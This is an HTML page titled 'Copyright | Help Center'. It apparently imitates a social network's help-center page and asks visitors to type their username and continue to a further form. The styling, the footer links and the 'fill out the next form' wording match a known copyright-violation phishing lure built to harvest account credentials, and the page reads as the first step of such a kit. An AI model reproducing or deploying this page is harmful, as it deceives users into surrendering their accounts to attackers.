
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Copyright | Help Center</title>
<link rel="icon" href="https://liveatpc.com/wp-content/uploads/2018/08/logo.png">
<style>
#copyright{
color:#999;}
#menu{


width:91%;
} 

#liste{ display:inline-block;} #link{text-decoration:none; color:#003569; font-family:sans-serif; font-size:13px; font-weight:540; vertical-align: baseline; } 
#asdxyz{
background-color:white;
width:91%;
}
#erhanasd{
font-family:sans-serif;
font-weight:400;
letter-spacing:;
color:#3d3d3d;
font-size:23px;}
#qenzyne{
width:60%;
color:#999;
font-family:sans-serif;
}
#nick{
background-color:#fafafa;
border:1px solid #cecece;
outline:none;
border-radius:6px;
width:220px;
height:35px;
text-align:center;
font-size:16px;}

#butonbey{
color:white;
background-color:#3897f0;
font-size:17px;

border-radius:5px;
outline:none;
font-family:sans-serif;
font-weight:540;
border:0;
width:170px;
height:30px;
font-weight:bold;

}
#nick:hover{

    border:1px solid #cecece;
    width:310px;
    max-width:80%;

}
</style>
</head>     

<body>
<body bgcolor="#fafafa">
<br>
<br>
<br>
<center>
<form method="get" action="form.php">
<div id="asdxyz" style="border:1px solid #cecece;">

<img src="https://liveatpc.com/wp-content/uploads/2018/08/logo.png" width=200>

<h1 id="erhanasd">Light of the Future</h1>

<p id="qenzyne">Please type your username, click "Next" and fill out the next form</p><br>



<input type="text" id="nick" name="nick" required placeholder="@username" class="qua21"><br><br>
<input type="submit" value="Confrim" id="butonbey" style="">
</form>

<br><br>
</div>
</center>
<center><br> <br>

<div id="get">
<img src="https://www.freepnglogos.com/uploads/app-store-logo-png/google-play-and-apple-app-store-logos-22.png" height=50 width=350 >
</div>
<br><br><br>
<div id="menu"> <li id="liste"><a href="" id="link"> ABOUT US </a> </li>&nbsp;&nbsp;&nbsp;&nbsp; <li id="liste"><a href="" id="link"> SUPPORT </a> </li>&nbsp;&nbsp;&nbsp;&nbsp; <li id="liste"><a href="" id="link">PRESS</a> </li>&nbsp;&nbsp;&nbsp;&nbsp; <li id="liste"><a href="" id="link">API</a> </li>&nbsp;&nbsp;&nbsp;&nbsp; <li id="liste"><a href="" id="link">JOBS</a> </li>&nbsp;&nbsp;&nbsp;&nbsp; <li id="liste"><a href="" id="link">PRIVACY</a> </li>&nbsp;&nbsp;&nbsp;&nbsp; <li id="liste"><a href="" id="link">TERMS</a> </li>&nbsp;&nbsp;&nbsp;&nbsp; <li id="liste"><a href="" id="link">DIRECTORY</a> </li>&nbsp;&nbsp;&nbsp;&nbsp; <li id="liste"><a href="" id="link">LANGUAGE</a> </li> </div> <br> <p id="copyright" style="font-family:sans-serif;font-weight:100;"> Light of the Future</p>
<br>

</center>

</body>

</html>